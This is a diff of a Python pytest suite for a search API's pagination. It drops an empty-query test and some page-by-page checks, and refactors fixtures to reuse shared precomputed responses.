-        empty_scenarios = [
-            ("", "empty string"),
-            ("   ", "whitespace only"),
-            ("null", "string 'null'"),
-            ("undefined", "string 'undefined'"),
-            ("None", "string 'None'"),
-        ]
-
-        for query_value, description in empty_scenarios:
-            response = search_test_app.get(f"/search?query={query_value}")
-            assert response.status_code == 200, f"Failed for {description}"
-            data = response.json()
-            assert "results" in data
-            assert data["query"] == query_value
-
-
 class TestSearchAPIPagination:
     """Test class for pagination functionality in search API"""
 
     @pytest.fixture
-    def pagination_responses(self, search_test_app):
+    def pagination_responses(self, shared_search_responses, search_test_app):
         """Pre-computed pagination responses to reduce API calls"""
         return {
-            "default": search_test_app.get("/search?query=").json(),
-            "page1_limit5": search_test_app.get("/search?query=&page=1&limit=5").json(),
-            "page2_limit3": search_test_app.get("/search?query=&page=2&limit=3").json(),
+            "default": shared_search_responses["empty_query"],
+            "page1_limit5": shared_search_responses["paginated_basic"],
+            "page2_limit3": shared_search_responses["paginated_page2"],
             "large_limit": search_test_app.get(
                 "/search?query=&page=1&limit=100"
             ).json(),
@@ -2097,6 +1711,7 @@ class TestSearchAPIPagination:
 
     def test_search_pagination_basic_functionality(self, pagination_responses):
         """Test basic pagination functionality using shared responses"""
+        
         # Test default values (page=1, limit=50)
         default_data = pagination_responses["default"]
         assert "pagination" in default_data
@@ -2160,24 +1775,6 @@ class TestSearchAPIPagination:
         assert isinstance(pagination["totalPages"], int)
         assert isinstance(pagination["hasNext"], bool)
 
-        # Test page and limit echo with various combinations
-        test_cases = [(1, 5), (3, 10), (2, 7), (1, 1)]
-        for page, limit in test_cases:
-            response = search_test_app.get(f"/search?query=&page={page}&limit={limit}")
-            assert response.status_code == 200
-
-            data = response.json()
-            pagination = data["pagination"]
-            assert pagination["page"] == page
-            assert pagination["limit"] == limit
-
-        # Test has_next and has_previous accuracy
-        # Test first page - should not have previous
-        response = search_test_app.get("/search?query=&page=1&limit=3")
-        assert response.status_code == 200
-        data = response.json()
-        pagination = data["pagination"]
-
         page = pagination["page"]
         limit = pagination["limit"]
         total = pagination["totalCount"]
@@ -2188,21 +1785,6 @@ class TestSearchAPIPagination:
         assert not pagination.get("hasPrevious", False)  # First page has no previous
         expected_has_next = end < total
         assert pagination.get("hasNext", False) == expected_has_next
-
-        # Test middle page if we have enough results
-        if total > 6:  # Need at least 7 items for page 2 to have both prev and next
-            response = search_test_app.get("/search?query=&page=2&limit=3")
-            assert response.status_code == 200
-            data = response.json()
-            pagination = data["pagination"]
-
-            page = pagination["page"]
-            start = (page - 1) * limit
-            end = start + limit
-
-            assert pagination.get("hasPrevious", False)  # Page 2 should have previous
-            expected_has_next = end < total
-            assert pagination.get("hasNext", False) == expected_has_next
 
     @pytest.mark.parametrize(
         "sort_by,sort_order,query,limit",
@@ -2372,22 +1954,17 @@ class TestSearchAPIPagination:
                 expected_pages = (total_count + limit - 1) // limit
                 assert pagination["totalPages"] == expected_pages
 
-    def test_search_pagination_navigation_flags(self, search_test_app):
+    def test_search_pagination_navigation_flags(self, search_test_app, shared_search_responses):
         """Test has_next and has_previous flags accuracy across different pages"""
         # Test first page has no previous
-        response = search_test_app.get("/search?query=&page=1&limit=5")
-        assert response.status_code == 200
-        data = response.json()
+        data = shared_search_responses["paginated_basic"]
         pagination = data["pagination"]
         assert not pagination.get("hasPrevious", False)
         assert pagination["page"] == 1
-
-        # Test last page has no next
-        response = search_test_app.get("/search?query=&limit=3")
-        total_pages = response.json()["pagination"].get("totalPages", 0)
+        total_pages = pagination.get("totalPages")
 
         if total_pages > 0:
-            response = search_test_app.get(f"/search?query=&page={total_pages}&limit=3")
+            response = search_test_app.get(f"/search?query=&page={total_pages}&limit=5")
             data = response.json()
             pagination = data["pagination"]
             assert not pagination.get("hasNext", False)
